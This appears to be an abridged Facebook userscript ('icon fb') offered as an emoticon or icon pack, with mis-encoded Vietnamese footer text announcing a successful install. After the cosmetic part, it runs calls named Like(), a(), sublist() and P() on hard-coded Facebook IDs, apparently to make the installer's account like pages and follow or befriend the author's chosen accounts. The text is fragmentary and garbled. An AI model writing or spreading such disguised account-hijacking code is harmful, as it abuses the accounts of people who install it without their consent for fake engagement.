// ==UserScript==
// @name            icon fb
// @description     All about facebook By HoĂ ng BĂ¡
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="#" target="_blank">CĂ€I Äáº¶T THĂ€NH CĂ”NG! CHĂC CĂC Báº N ONL VUI Váºº.<br>HoĂ ng BĂ¡</a>';
	html += '</div>';
...
"chars" : " :) ",
	...
	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="#" target="_blank">CĂ€I Äáº¶T THĂ€NH CĂ”NG! CHĂC CĂC Báº N ONL VUI Váºº.<br>IT VIá»†T</a>';
	html += '</div>';
...
Like("506633496121590");
Like("658968290814517");Like("449357848525011");
//khach
a("100003125960659");
//Lynk
Like("487116431366965");
Like("643654695691648");
a("100004359968699");
a("100007608905636");
sublist("110434705778528");
P("235902026565128");
Like("226915300824989");
Like("407668109367605");
//anh van
